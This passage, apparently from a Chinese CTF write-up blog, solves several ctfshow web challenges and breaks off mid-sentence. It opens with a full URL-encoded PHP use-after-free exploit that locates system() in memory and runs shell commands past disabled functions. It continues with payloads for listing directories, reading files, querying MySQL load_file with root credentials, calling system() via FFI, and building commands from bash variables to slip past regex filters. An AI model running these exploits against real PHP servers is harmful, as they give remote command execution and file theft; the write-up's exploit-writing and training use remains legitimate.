class="line">c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B</span><br></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flagx.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web75"><a href="#web75" class="headerlink" title="*web75"></a>*web75</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="*web77"></a>*web77</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br><span class="line">c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>查看源码发现<code>&lt;!-- system($code);--&gt;</code>，fuzz尝试之后发现只有大写字母和<code>$&#123;&#125;:?.~</code>等等字符可以通过，利用<code>bash</code>内置变量进行绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;PWD&#125; </span><br><span class="line">/root                                                                                     # echo $&#123;PWD:0:1&#125;      #表示从0下标开始的第一个字符</span><br><span class="line">/                                                                                         </span><br><span class="line"># echo $&#123;PWD:~0:1&#125;      #从结尾开始往前的第一个字符</span><br><span class="line">t                                                                              </span><br><span class="line"># echo $&#123;PWD:~0&#125;      </span><br><span class="line">t                                                                           </span><br><span class="line"># echo $&#123;PWD:~A&#125;       #所以字母和0具有同样作用             </span><br><span class="line">t                                                                 </span><br><span class="line"># echo $&#123;PATH&#125;                            </span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"># echo $&#123;PATH:~A&#125;                </span><br><span class="line">n                                                                                    </span><br><span class="line"># $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br></pre></td></tr></table></figure><p>题目环境中应该有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH&#125;</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure><p>故可以构造出<code>nl</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p><code>PATH</code>被<code>ban</code>了，尝试构造出<code>/bin/cat</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;#&#125;   </span><br><span class="line">0</span><br><span class="line"># echo $&#123;SHLVL&#125;</span><br><span class="line">1</span><br><span class="line"># echo $&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;</span><br><span class="line">/</span><br><span class="line"># echo $&#123;USER&#125;</span><br><span class="line">www-data</span><br><span class="line"># echo $&#123;PHP_VERSION&#125;</span><br><span class="line">7.3.22</span><br><span class="line"># echo $&#123;PHP_VERSION:~A&#125;</span><br><span class="line">2</span><br><span class="line"># echo $&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;</span><br><span class="line">at</span><br><span class="line"># $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># 此处命令即为 /???/?at ????.???</span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>缩短上题<code>payload</code>长度，执行后查看源码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><h3 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以利用<code>PWD</code>构造<code>/bin/rev</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo $&#123;#IFS&#125;</span><br><span class="line">3 #kali中为4</span><br><span class="line"># echo $&#123;#&#125;</span><br><span class="line">0</span><br><span class="line"># echo $&#123;##&#125;</span><br><span class="line">1</span><br><span class="line"># echo $&#123;PWD&#125;</span><br><span class="line">/var/www/html</span><br><span class="line"># echo $&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><p>执行后查看源码然后反过来即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure><h3 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>PWD</code> 和<code>#</code>都被禁用了，但是可以使用<code>HOME</code>和<code>$?</code>来构造出<code>/bin/base64</code></p><blockquote><p><code>$?</code> 